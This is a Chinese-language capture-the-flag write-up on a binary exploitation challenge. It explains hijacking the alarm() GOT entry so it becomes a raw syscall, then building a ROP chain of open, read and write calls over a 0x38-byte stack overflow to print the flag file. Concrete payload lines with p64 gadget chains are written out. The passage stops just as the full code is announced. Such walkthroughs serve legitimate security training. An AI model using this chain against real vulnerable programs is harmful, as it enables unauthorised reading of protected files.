这里面最重要的是实现 got 表劫持和 ROP 链的实现，利用 open()这一系统函数远程打开 flag 文件， 而不是夺取 shell 权限：

为什么会想到这个呢，可能时看到了 flag 字段的出现，但没有 system 函数这一类，想到了远程打 开文件这样把..（就当作公式吧）

整体思路： 先把 alarm 的 got 表修改一下，改成 open（）打开 flag 文件，然后读取在 bss 段上，利用 printf 或 write 打在屏幕上（改 alarm 因为他没用。。），

注：选 bss 段是因为 bss 段的可读可执行功能，bss 段可以自己去 ida 的页面上去搜，随便找 一段就好了（尽量长一点）。

这里我们会发现一个知识点，这些 Libc.so 里的系统函数都有 syscall 这一调用这一函数，并且 eax 存放序列号。

gdb 调试，r 运行，再按 ctrl c 强行停止，在用 disass alarm看下反汇编

alarm 序列号为 0x25，并且我们可以看到 syscall 与起点 mov eax 的偏移量为 5。（这是 重点！） 然后我们要去找 open 的序列号

这里附上查找链接(68 条消息) Linux 系统调用表(system call table),然后 open 序列号你知道了，现在只需要完成 alarm got 表的修改，那怎么 改呢? 网上大佬们都很牛皮的说靠经验更改了一段这个….

然后 open 序列号你知道了，现在只需要完成 alarm got 表的修改，那怎么改呢?

用 ROPgadget 找了一下…..

这一段的作用是吧 rdi 里的值作为地址，指向的数值加上 al 里的值。

所以我们可以把 alarm 的 got 表地址放在 rdi 里，然后把偏移量 5 放到 rax 里，我们就实现了把 alarma 的调用改成了 syscall 的调用。

好了最难的已经过去了，现在就是一大串的 ROP 链实现：

POPADD 即实现上图红线功能，劫持 got 表POPrax 把值弹到 rax 里，其他的以此类推。

注意特别的是 POPrsi 是 POP RSI,POP R15,所以后面加了两个 p64()。（ROPgadget 里只有这个兄弟们可以自己试试）

pay = b’a’*0x38+ p64(POPrax)+p64(5)+p64(POPrdi)+p64(alarm_got)+p64(POPADD)

0x38 填充到返回地址，然后后把 5 弹到 RAX,alarm got 表弹到 RDI,后面接 POPADD 实现 GOT

表劫持

Pay += p64(POPrdi)+p64(flag)+p64(POPrsi)+p64(0)+p64(0)+ p64(POPrax) + p64(2) +

p64(alarm_plt) 调用 open 函数(0,flag)

Pay += p64(POPrdi)+p64(3)+p64(POPrsi)+p64(bss)+p64(0)+p64(POPrdx)+p64(200)+p64(read_plt)

调用 read 函数（3,buf,200) 3 是默认的，200 为读取 200 字节

pay += p64(POPrdi)+p64(1)+p64(POPrsi)+p64(bss)+p64(0)+p64(POPrdx)+p64(200)+p64(write_plt)

调用 write 函数（1,buf,200）1 为默认值，200 为往屏幕上写 200 字节

至此 ROP 链构建完成，展示全部代码
